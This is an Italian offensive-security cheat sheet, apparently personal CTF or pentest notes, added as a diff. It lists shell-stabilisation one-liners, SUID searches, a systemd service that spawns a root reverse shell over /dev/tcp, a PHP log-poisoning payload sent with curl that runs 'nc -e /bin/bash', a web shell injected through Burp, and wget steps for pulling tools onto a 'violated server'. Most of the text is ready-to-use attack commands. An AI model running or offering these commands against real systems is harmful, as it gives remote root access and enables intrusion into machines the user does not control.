@@ -1,0 +1,101 @@
+STABILIZZAZIONE SHELL 
+********************************************************************************************************************************
+METODO 1
+********************************************************************************************************************************
+METODO PYTHON 
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+python -c 'import os; os.system("/bin/sh");'
+
+python3 -c 'import os; os.system("/bin/sh");'
+********************************************************************************************************************************
+METODO PERL
+
+perl -e 'system("/bin/sh");'
+
+********************************************************************************************************************************
+
+METODO AWK
+
+awk 'BEGIN {system("/bin/sh")}'
+
+********************************************************************************************************************************
+ACCESSO AI COMANDI "COMPILAZIONE AUTOMATICA" "CLEAR" "MEMORIZZAZIONE DEL COMANDO PRECEDENTE CON LA FRECCIA SU" ECC...
+
+stty raw -echo 
+
+export TERM=xterm   
+********************************************************************************************************************************
+METODO 2
+********************************************************************************************************************************
+RLWRAP - NETCAT
+ 
+sudo apt install rlwrap 
+
+Per usare rlwrap, invochiamo un listener leggermente diverso:
+
+rlwrap nc -lvnp <port>
+
+Anteporre il nostro ascoltatore netcat con "rlwrap" ci dà una shell molto più completa.
+*******************************************************************************************************************************
+PRIVILEGE ESCALATION 
+*******************************************************************************************************************************
+
+TROVA FILE CON BIT SUID/GUID IMPOSTATO
+
+find / -perm -u=s -type f 2>/dev/null
+
+find / -user root -perm -4000 -print 2>/dev/null
+
+find . -exec /bin/sh \; -quit
+
+*******************************************************************************************************************************
+ UTILIZZO DI SYSTEMCTL
+ 
+ 1) creare un file " root.service "
+      - [Unit]
+        Description=root
+        
+        [Service]
+        Type=simple
+        User=root
+        ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/(nostro ip)/(nr. di porta) 0>&1'
+        
+        [Install]
+        WantedBy=multi-user.target
+2) caricare il file sul server violato:
+      - sudo python -m SimpleHHTPServer 80
+      - (nel server violato) wget http://(nostro ip)/root.service
+3) (in locale) nc -nvlp (nr. di porta scelto)
+4) (nel server violato) systemctl enable /tmp/root.service
+5) (nel server violato) systemctl start root
+6) Controllare in locale se è andato tutto a buon fine. Così facendo avremmo una bin/bash da root !
+
+********************************************************************************************************************************
+COMMANDS INJECTION
+********************************************************************************************************************************
+METODO CURL: PHP REVERSE SHELL
+
+curl -A "<?= shell_exec('nc (ip locale) (nr. di porta) -e /bin/bash');?>" http://(ip da violare)/(file corrotto)
+
+********************************************************************************************************************************
+METODO BURP SUITE
+
+1) Attivare il proxy manuale (foxyproxy) sul browser 
+2) catturare la richiesta con la funzione intercept 
+3) modificare il primo campo dove si trova la GET e dopo il campo ?file= con: 
+   - <?php system($_GET['cmd']) ?>
+4) alla fine dell' URL scriviamo:
+   - ...&cmd=nc (ip locale) (nr. di porta) -e /bin/bash
+5) Controllare in locale se è andato tutto a buon fine. 
+
+*********************************************************************************************************************************
+IMPORTARE FILE DA LOCALE SUL SERVER VIOLATO
+*********************************************************************************************************************************
+SERVER PYTHON + WGET
+
+1) Avviare in locale il server in python, inserendosi nel percorso dove si trovano i file da importare: 
+   - python2 -m SimpleHTTPServer (nr. di porta selta)
+2) digitare nel server violato: 
+   - wget http://(ip locale)/(nome del file da importare)
